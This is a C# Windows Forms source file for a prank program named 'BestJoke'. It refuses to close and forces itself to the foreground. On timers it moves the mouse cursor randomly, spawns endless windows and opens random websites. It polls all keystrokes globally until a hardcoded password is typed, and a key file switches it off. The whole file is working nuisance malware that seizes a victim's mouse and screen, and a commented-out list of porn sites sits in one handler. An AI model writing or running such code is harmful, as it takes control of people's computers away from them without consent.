using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Collections;
using System.Diagnostics;
using System.IO;

namespace BestJoke
{
	public partial class Form1 : Form
	{
		[DllImport("user32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);

		[DllImport("User32.dll")]
		static extern int SetForegroundWindow(IntPtr hWnd);

		[DllImport("user32.dll")]
		internal static extern bool SendMessage(IntPtr hWnd, Int32 msg, Int32 wParam, Int32 lParam);
		static Int32 WM_SYSCOMMAND = 0x0112;
		static Int32 SC_RESTORE = 0xF120;


		bool on = true;

		string last_keys = "";
		string pass = "wordulike";

		List<FormFuck> forms = new List<FormFuck>();

		public Form1()
		{
			InitializeComponent();

			try
			{
				string key = File.ReadAllText("key.txt");

				if (key == "itsnotpassyousearch") on = false;
			}
			catch
			{
				Log("Key open falied");
			}
		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.Hide();
			e.Cancel = true;
			// Cursor.Position = new Point(0, 0);
		}

		private void timerReadKeys_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				for (int i = 0; i < 255; i++)
				{
					int state = GetAsyncKeyState(i);

					if (state != 0)
					{
						string key = ((Keys)i).ToString();

						if (pass.ToUpper().Contains(key.ToUpper()))
						{
							if (last_keys.Length > 0)
							{
								if (last_keys[last_keys.Length - 1] != key[0]) last_keys += key;
							}
							else
							{
								last_keys += key;
							}
						}

					}
				}

				if (last_keys.ToUpper().Contains(pass.ToUpper()))
				{
					on = false;

					foreach (FormFuck f in forms)
					{
						f.Close();
					}

					MessageBox.Show("Pass entered!");
				}
				if (last_keys.Length > 100)
				{
					last_keys.Remove(0, 50);
				}
			}
		}

		private void timerMouseMove_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				// --------------------------------------------

				try
				{
					var proc = Process.GetCurrentProcess();

					if (proc != null)
					{
						var pointer = proc.MainWindowHandle;

						SetForegroundWindow(pointer);
						SendMessage(pointer, WM_SYSCOMMAND, SC_RESTORE, 0);
					}
				}
				catch (Exception ex)
				{
					Log("timerMouseMove_Tick 1 " + ex.ToString());
				}

				// --------------------------------------------

				int width = 1920;
				int height = 1080;

				Random rnd = new Random();

				try
				{
					Size resolution = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Size;

					width = resolution.Width;
					height = resolution.Height;
				}
				catch (Exception ex)
				{
					Log("Screen.PrimaryScreen.Bounds.Size " + ex.ToString());
				}

				try
				{
					//Cursor.Position = new Point(rnd.Next(0, resolution.Width), rnd.Next(0, resolution.Height));

					Worker.SetCursorPos(rnd.Next(0, width), rnd.Next(0, height));
					Worker.mouse_event(0x1, rnd.Next(0, width), rnd.Next(0, height), 0, 0); //move
				}
				catch (Exception ex)
				{
					Log("Mouse mobe " + ex.ToString());
				}
			}
		}

		private void timerOpenWindow_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				try
				{
					FormFuck ff = new FormFuck();
					ff.Show();
					forms.Add(ff);
				}
				catch (Exception ex)
				{
					Log("timerOpenWindow_Tick " + ex.ToString());
				}
			}		
		}

		private void Form1_Shown(object sender, EventArgs e)
		{
			//this.Hide();
		}

		private void timerSiteOpen_Tick(object sender, EventArgs e)
		{
			if (on)
			{
				Random rnd = new Random();

				/*
				List<string> sites = new List<string>()
				{
					"https://rt.pornhub.com/",
					"https://www.xvideos.com/"
				}; 
				*/

				List<string> sites = new List<string>()
				{
					"https://fb.com/",
					"https://vk.com/",
					"https://www.google.com/",
					"https://www.instagram.com/"
				};

				try
				{
					System.Diagnostics.Process.Start(sites[rnd.Next(0, sites.Count)]);
				}
				catch (Exception ex)
				{
					Log("timerSiteOpen_Tick " + ex.ToString());
				}
			}
		}

		private void Log(string str)
		{
			try
			{
				string log_str = $"{DateTime.Now} > {str}\r\n";
				File.AppendAllText("log.txt", log_str);
			}
			catch
			{
				//
			}
		}
	}

	class Worker
	{
		[DllImport("user32.dll")]
		public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool SetCursorPos(int x, int y);

	}
}
